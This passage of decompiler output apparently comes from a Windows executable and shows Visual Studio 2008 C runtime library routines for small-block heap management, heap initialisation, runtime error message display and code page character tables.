  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00433190)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_find_block
// 
// Library: Visual Studio 2008 Release

uint __cdecl ___sbh_find_block(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00437d54;
  while( true ) {
    if (DAT_00437d50 * 0x14 + DAT_00437d54 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___sbh_free_block
// 
// Library: Visual Studio 2008 Release

void __cdecl ___sbh_free_block(uint *param_1,int param_2)

{
  int *piVar1;
  char *pcVar2;
  uint *puVar3;
  int *piVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar6 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar4 = (int *)(uVar14 * 0x204 + 0x144 + uVar6);
  local_8 = *puVar12 - 1;
  if ((local_8 & 1) == 0) {
    puVar10 = (uint *)(local_8 + (int)puVar12);
    uVar13 = *puVar10;
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar13 & 1) == 0) {
      uVar9 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (puVar10[1] == puVar10[2]) {
        if (uVar9 < 0x20) {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar2 = (char *)(uVar9 + 4 + uVar6);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar11 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar11 = *puVar11 & uVar9;
          *pcVar2 = *pcVar2 + -1;
          if (*pcVar2 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar13;
      *(uint *)(puVar10[2] + 4) = puVar10[1];
      *(uint *)(puVar10[1] + 8) = puVar10[2];
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
      puVar12 = (uint *)((int)puVar12 - uVar7);
      puVar11 = (uint *)(((int)uVar7 >> 4) - 1);
      if ((uint *)0x3f < puVar11) {
        puVar11 = (uint *)0x3f;
      }
      local_8 = local_8 + uVar7;
      puVar10 = (uint *)(((int)local_8 >> 4) - 1);
      if ((uint *)0x3f < puVar10) {
        puVar10 = (uint *)0x3f;
      }
      if (puVar11 != puVar10) {
        if (puVar12[1] == puVar12[2]) {
          if (puVar11 < (uint *)0x20) {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              *param_1 = *param_1 & uVar13;
            }
          }
          else {
            uVar13 = ~(0x80000000U >> ((byte)puVar11 - 0x20 & 0x1f));
            puVar3 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
            *puVar3 = *puVar3 & uVar13;
            pcVar2 = (char *)((int)puVar11 + uVar6 + 4);
            *pcVar2 = *pcVar2 + -1;
            if (*pcVar2 == '\0') {
              param_1[1] = param_1[1] & uVar13;
            }
          }
        }
        *(uint *)(puVar12[2] + 4) = puVar12[1];
        *(uint *)(puVar12[1] + 8) = puVar12[2];
      }
    }
    if (((uVar7 & 1) != 0) || (puVar11 != puVar10)) {
      piVar1 = piVar4 + (int)puVar10 * 2;
      uVar13 = piVar1[1];
      puVar12[2] = (uint)piVar1;
      puVar12[1] = uVar13;
      piVar1[1] = (int)puVar12;
      *(uint **)(puVar12[1] + 8) = puVar12;
      if (puVar12[1] == puVar12[2]) {
        cVar5 = *(char *)((int)puVar10 + uVar6 + 4);
        *(char *)((int)puVar10 + uVar6 + 4) = cVar5 + '\x01';
        bVar8 = (byte)puVar10;
        if (puVar10 < (uint *)0x20) {
          if (cVar5 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 & 0x1f);
        }
        else {
          if (cVar5 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
          }
          puVar10 = (uint *)(uVar6 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
      }
    }
    *puVar12 = local_8;
    *(uint *)((local_8 - 4) + (int)puVar12) = local_8;
    *piVar4 = *piVar4 + -1;
    if (*piVar4 == 0) {
      if (DAT_00436450 != (uint *)0x0) {
        VirtualFree((LPVOID)(DAT_00437d64 * 0x8000 + DAT_00436450[3]),0x8000,0x4000);
        DAT_00436450[2] = DAT_00436450[2] | 0x80000000U >> ((byte)DAT_00437d64 & 0x1f);
        *(undefined4 *)(DAT_00436450[4] + 0xc4 + DAT_00437d64 * 4) = 0;
        *(char *)(DAT_00436450[4] + 0x43) = *(char *)(DAT_00436450[4] + 0x43) + -1;
        if (*(char *)(DAT_00436450[4] + 0x43) == '\0') {
          DAT_00436450[1] = DAT_00436450[1] & 0xfffffffe;
        }
        if (DAT_00436450[2] == 0xffffffff) {
          VirtualFree((LPVOID)DAT_00436450[3],0,0x8000);
          HeapFree(DAT_00436454,0,(LPVOID)DAT_00436450[4]);
          _memmove(DAT_00436450,DAT_00436450 + 5,
                   (DAT_00437d50 * 0x14 - (int)DAT_00436450) + -0x14 + DAT_00437d54);
          DAT_00437d50 = DAT_00437d50 + -1;
          if (DAT_00436450 < param_1) {
            param_1 = param_1 + -5;
          }
          DAT_00437d5c = DAT_00437d54;
        }
      }
      DAT_00436450 = param_1;
      DAT_00437d64 = uVar14;
    }
  }
  return;
}



// Library Function - Single Match
//  ___sbh_alloc_new_region
// 
// Library: Visual Studio 2008 Release

undefined4 * ___sbh_alloc_new_region(void)

{
  LPVOID pvVar1;
  undefined4 *puVar2;
  
  if (DAT_00437d50 == DAT_00437d60) {
    pvVar1 = HeapReAlloc(DAT_00436454,0,DAT_00437d54,(DAT_00437d60 + 0x10) * 0x14);
    if (pvVar1 == (LPVOID)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00437d60 = DAT_00437d60 + 0x10;
    DAT_00437d54 = pvVar1;
  }
  puVar2 = (undefined4 *)(DAT_00437d50 * 0x14 + (int)DAT_00437d54);
  pvVar1 = HeapAlloc(DAT_00436454,8,0x41c4);
  puVar2[4] = pvVar1;
  if (pvVar1 != (LPVOID)0x0) {
    pvVar1 = VirtualAlloc((LPVOID)0x0,0x100000,0x2000,4);
    puVar2[3] = pvVar1;
    if (pvVar1 != (LPVOID)0x0) {
      puVar2[2] = 0xffffffff;
      *puVar2 = 0;
      puVar2[1] = 0;
      DAT_00437d50 = DAT_00437d50 + 1;
      *(undefined4 *)puVar2[4] = 0xffffffff;
      return puVar2;
    }
    HeapFree(DAT_00436454,0,(LPVOID)puVar2[4]);
  }
  return (undefined4 *)0x0;
}



// Library Function - Single Match
//  ___sbh_alloc_new_group
// 
// Library: Visual Studio 2008 Release

int __cdecl ___sbh_alloc_new_group(int param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  LPVOID pvVar5;
  int *piVar6;
  int iVar7;
  int iVar8;
  LPVOID lpAddress;
  
  iVar2 = *(int *)(param_1 + 0x10);
  iVar8 = 0;
  for (iVar3 = *(int *)(param_1 + 8); -1 < iVar3; iVar3 = iVar3 * 2) {
    iVar8 = iVar8 + 1;
  }
  iVar3 = iVar8 * 0x204 + 0x144 + iVar2;
  iVar7 = 0x3f;
  iVar4 = iVar3;
  do {
    *(int *)(iVar4 + 8) = iVar4;
    *(int *)(iVar4 + 4) = iVar4;
    iVar4 = iVar4 + 8;
    iVar7 = iVar7 + -1;
  } while (iVar7 != 0);
  lpAddress = (LPVOID)(iVar8 * 0x8000 + *(int *)(param_1 + 0xc));
  pvVar5 = VirtualAlloc(lpAddress,0x8000,0x1000,4);
  if (pvVar5 == (LPVOID)0x0) {
    iVar8 = -1;
  }
  else {
    if (lpAddress <= (LPVOID)((int)lpAddress + 0x7000U)) {
      piVar6 = (int *)((int)lpAddress + 0x10);
      iVar7 = ((uint)((int)(LPVOID)((int)lpAddress + 0x7000U) - (int)lpAddress) >> 0xc) + 1;
      do {
        piVar6[-2] = -1;
        piVar6[0x3fb] = -1;
        *piVar6 = (int)(piVar6 + 0x3ff);
        piVar6[-1] = 0xff0;
        piVar6[1] = (int)(piVar6 + -0x401);
        piVar6[0x3fa] = 0xff0;
        piVar6 = piVar6 + 0x400;
        iVar7 = iVar7 + -1;
      } while (iVar7 != 0);
    }
    *(int *)(iVar3 + 0x1fc) = (int)lpAddress + 0xc;
    *(int *)((int)lpAddress + 0x14) = iVar3 + 0x1f8;
    *(int *)(iVar3 + 0x200) = (int)lpAddress + 0x700c;
    *(int *)((int)lpAddress + 0x7010) = iVar3 + 0x1f8;
    *(undefined4 *)(iVar2 + 0x44 + iVar8 * 4) = 0;
    *(undefined4 *)(iVar2 + 0xc4 + iVar8 * 4) = 1;
    cVar1 = *(char *)(iVar2 + 0x43);
    *(char *)(iVar2 + 0x43) = cVar1 + '\x01';
    if (cVar1 == '\0') {
      *(uint *)(param_1 + 4) = *(uint *)(param_1 + 4) | 1;
    }
    *(uint *)(param_1 + 8) = *(uint *)(param_1 + 8) & ~(0x80000000U >> ((byte)iVar8 & 0x1f));
  }
  return iVar8;
}



// Library Function - Single Match
//  ___sbh_resize_block
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___sbh_resize_block(uint *param_1,int param_2,int param_3)

{
  char *pcVar1;
  uint *puVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  char cVar6;
  uint uVar7;
  uint *puVar8;
  int iVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint local_c;
  
  uVar7 = param_1[4];
  uVar10 = param_2 - param_1[3] >> 0xf;
  iVar5 = uVar10 * 0x204 + 0x144 + uVar7;
  uVar12 = param_3 + 0x17U & 0xfffffff0;
  iVar9 = *(int *)(param_2 + -4) + -1;
  puVar8 = (uint *)(*(int *)(param_2 + -4) + -5 + param_2);
  uVar13 = *puVar8;
  if (iVar9 < (int)uVar12) {
    if (((uVar13 & 1) != 0) || ((int)(uVar13 + iVar9) < (int)uVar12)) {
      return 0;
    }
    local_c = ((int)uVar13 >> 4) - 1;
    if (0x3f < local_c) {
      local_c = 0x3f;
    }
    if (puVar8[1] == puVar8[2]) {
      if (local_c < 0x20) {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c & 0x1f));
        puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(local_c + 4 + uVar7);
        uVar11 = ~(0x80000000U >> ((byte)local_c - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(uint *)(puVar8[2] + 4) = puVar8[1];
    *(uint *)(puVar8[1] + 8) = puVar8[2];
    iVar9 = uVar13 + (iVar9 - uVar12);
    if (0 < iVar9) {
      uVar13 = (iVar9 >> 4) - 1;
      iVar3 = param_2 + -4 + uVar12;
      if (0x3f < uVar13) {
        uVar13 = 0x3f;
      }
      iVar5 = iVar5 + uVar13 * 8;
      *(undefined4 *)(iVar3 + 4) = *(undefined4 *)(iVar5 + 4);
      *(int *)(iVar3 + 8) = iVar5;
      *(int *)(iVar5 + 4) = iVar3;
      *(int *)(*(int *)(iVar3 + 4) + 8) = iVar3;
      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2008 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_00437d54 + DAT_00437d50 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_00437d5c;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_00437d54;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_00437d5c && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_00437d5c) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_00437d54;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_00437d5c && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_00437d5c) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_00437d5c = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0041ca0a;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0041ca0a:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_00436450)) && (local_8 == DAT_00437d64)) {
    DAT_00436450 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2008 Release

int __cdecl __heap_init(void)

{
  int in_stack_00000004;
  
  DAT_00436454 = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_00436454 == (HANDLE)0x0) {
    return 0;
  }
  DAT_00437d4c = 1;
  return 1;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2008 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  uint uVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_004332b8)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 != 1) && ((iVar3 = __set_error_mode(3), iVar3 != 0 || (DAT_00432c1c != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar4 = _strcpy_s(&DAT_00436458,0x314,"Runtime Error!\n\nProgram: ");
      if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_00436575 = 0;
      DVar5 = GetModuleFileNameA((HMODULE)0x0,&DAT_00436471,0x104);
      if ((DVar5 == 0) &&
         (eVar4 = _strcpy_s(&DAT_00436471,0x2fb,"<program name unknown>"), eVar4 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar6 = _strlen(&DAT_00436471);
      if (0x3c < sVar6 + 1) {
        sVar6 = _strlen(&DAT_00436471);
        eVar4 = _strncpy_s((char *)(sVar6 + 0x436436),
                           (int)&DAT_0043676c - (int)(char *)(sVar6 + 0x436436),"...",3);
        if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar4 = _strcat_s(&DAT_00436458,0x314,"\n\n");
      if (eVar4 == 0) {
        eVar4 = _strcat_s(&DAT_00436458,0x314,*(char **)(local_8 * 8 + 0x4332bc));
        if (eVar4 == 0) {
          ___crtMessageBoxA(&DAT_00436458,"Microsoft Visual C++ Runtime Library",0x12010);
          return;
        }
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
      lpOverlapped = (LPOVERLAPPED)0x0;
      lpNumberOfBytesWritten = &local_c;
      ppcVar1 = (char **)(uVar2 * 8 + 0x4332bc);
      sVar6 = _strlen(*ppcVar1);
      WriteFile(hFile,*ppcVar1,sVar6,lpNumberOfBytesWritten,lpOverlapped);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2008 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_00432c1c != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



void __cdecl FUN_0041cc61(undefined4 param_1)

{
  DAT_0043676c = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2008 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_0043676c);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_00433378 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_00433378 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2008 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_0041cea4:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_0041cea4;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
